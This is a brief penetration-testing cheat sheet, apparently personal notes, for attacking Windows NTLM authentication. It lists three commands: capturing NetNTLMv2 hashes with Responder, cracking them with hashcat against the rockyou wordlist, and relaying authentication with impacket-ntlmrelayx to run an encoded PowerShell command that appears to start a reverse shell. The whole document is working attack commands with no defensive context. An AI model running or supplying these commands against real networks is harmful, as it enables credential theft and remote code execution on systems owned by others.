# NETNTLMV2
#responder
```
sudo responder -I -A tun0

# NETNTLMV2
```

#crack 
```
hashcat -m 5600 [hash file] /usr/share/wordlists/rockyou.txt --force
```

#relay 
```
sudo impacket-ntlmrelayx --no-http-server -smb2support -t [ip] -c "powershell -enc JABjAGwAaQBlAG4AdA..."
```